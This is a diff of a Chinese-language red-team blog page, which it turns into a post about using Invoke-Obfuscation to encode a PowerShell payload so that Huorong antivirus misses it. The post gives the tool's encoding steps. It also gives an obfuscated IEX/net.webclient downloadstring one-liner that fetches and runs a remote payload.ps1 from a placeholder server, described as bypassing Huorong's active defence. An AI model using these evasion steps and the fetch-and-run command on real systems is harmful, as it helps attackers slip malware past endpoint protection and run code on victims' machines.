@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>红队 | rebootORZ</title>
+<title>Invoke-Obfuscation实现ps1脚本免杀 | rebootORZ</title>
 <meta name="description" content="一名默默无闻的攻城狮">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -23,6 +23,7 @@
 
   </head>
   <body>
+  
     <nav class="navbar border fixed split-nav">
   <div class="nav-brand">
     <h3><a href="https://rebootorz.github.io">rebootORZ</a></h3>
@@ -79,112 +80,69 @@
     <div id="top" class="row site">
       <div class="sm-12 md-8 col">
         <div class="paper">
-          <h2 class="current-tag">标签: 红队</h2>
-          
-  <article class="article">
-    <h2 class="article-title">
-      <a href="https://rebootorz.github.io/HdxsJLVVU/">Invoke-Obfuscation实现ps1脚本免杀</a>
-    </h2>
-    <p class="article-meta">
-      2021-01-14
-      
-        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge warning">
-          红队
-        </a>
-      
-    </p>
-    <p class="text-lead">
-      
-    </p>
-    <div class="row">
-      <a href="https://rebootorz.github.io/HdxsJLVVU/" class="readmore-link">
-        <button>
-          Read More
-        </button>
-      </a>
-    </div>
-  </article>
+          <article class="article">
+            <h1>Invoke-Obfuscation实现ps1脚本免杀</h1>
+            <p class="article-meta">
+              2021-01-14
+              
+                <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge success">
+                  红队
+                </a>
+              
+            </p>
+            
+            <div class="post-content">
+              <p>项目地址：https://github.com/danielbohannon/Invoke-Obfuscation<br>
+下载后，使用方法为 导入 -&gt; 设置免杀脚本路径 -&gt; encoding编码 -&gt; 选择编码方式 -&gt; 设置编码后输出文件路径。</p>
+<pre><code>导入
+Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation
 
-  <article class="article">
-    <h2 class="article-title">
-      <a href="https://rebootorz.github.io/6jdjqWmOL/">Powershell免杀上线</a>
-    </h2>
-    <p class="article-meta">
-      2021-01-14
-      
-        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge warning">
-          红队
-        </a>
-      
-    </p>
-    <p class="text-lead">
-      
-    </p>
-    <div class="row">
-      <a href="https://rebootorz.github.io/6jdjqWmOL/" class="readmore-link">
-        <button>
-          Read More
-        </button>
-      </a>
-    </div>
-  </article>
+设置
+set scriptpath F:\渗透必备\免杀\Invoke-Obfuscation\payload.ps1
 
-  <article class="article">
-    <h2 class="article-title">
-      <a href="https://rebootorz.github.io/T5B_aJTTL/">FRP多层穿透实战</a>
-    </h2>
-    <p class="article-meta">
-      2021-01-11
-      
-        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge success">
-          红队
-        </a>
-      
-    </p>
-    <p class="text-lead">
-      
-    </p>
-    <div class="row">
-      <a href="https://rebootorz.github.io/T5B_aJTTL/" class="readmore-link">
-        <button>
-          Read More
-        </button>
-      </a>
-    </div>
-  </article>
+编码
+encoding
 
-  <article class="article">
-    <h2 class="article-title">
-      <a href="https://rebootorz.github.io/jian-dan-chuan-tou/">简单穿透</a>
-    </h2>
-    <p class="article-meta">
-      2021-01-11
-      
-        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge ">
-          红队
-        </a>
-      
-    </p>
-    <p class="text-lead">
-      
-    </p>
-    <div class="row">
-      <a href="https://rebootorz.github.io/jian-dan-chuan-tou/" class="readmore-link">
-        <button>
-          Read More
-        </button>
-      </a>
-    </div>
-  </article>
+选择编码方式
+1-8
 
+设置编码后输出文件路径
+out F:\渗透必备\免杀\Invoke-Obfuscation\payload1.ps1
+</code></pre>
+<p>这里使用火绒查杀一下编码后的文件，如下图，未发现安全风险。<br>
+<img src="https://rebootorz.github.io/post-images/1610603990823.png" alt="" loading="lazy"><br>
+文件已免杀，后续就是Powershell执行了，这里有两种方法，</p>
+<p>一：采用把文件下载到本地，powershell执行；</p>
+<p>二：文件放到服务器，远程Powershell执行。</p>
+<p>考虑到少交互的原则，第一步还需上传文件到本地，多了一步骤，故选用第二种方案。</p>
+<p>这里把ps1传到vps做远程加载演示，上传后可访问.</p>
+<p>下一步，即执行powershell命令，可powershell行为特征也被火绒记录在册，可通过如下方式，绕过火绒该防护。</p>
+<pre><code>powershell.exe &quot;$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''http://xxxx/payload.ps1''))';$a3=&quot;$a1,$a2&quot;;IEX(-join $a3)&quot;
+</code></pre>
+<p>可绕过火绒主动防御.<br>
+更多powershell执行免杀的方法参考文章：<br>
+https://rebootorz.github.io/6jdjqWmOL/</p>
 
+            </div>
+          </article>
         </div>
-        <div class="row flex-edges">
-  
-  
-</div>
-
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://rebootorz.github.io/6jdjqWmOL/">
+                <h3 class="post-title">
+                  Powershell免杀上线
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
       </div>
+
       <div class="sm-12 md-4 col sidebar">
   <div class="paper info-container">
     <img src="https://rebootorz.github.io/images/avatar.png?v=1610604691591" class="no-responsive avatar">
@@ -253,11 +211,11 @@
     </div>
     <div class="row">
       
-        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge warning">
+        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge success">
           红队
         </a>
       
-        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge success">
+        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge ">
           物联网安全
         </a>
       
@@ -267,6 +225,7 @@
     高度自律  绝对自由 | <a class="rss" href="https://rebootorz.github.io/atom.xml" target="_blank">RSS</a>
   </div>
 </div>
+
 
     </div>
 
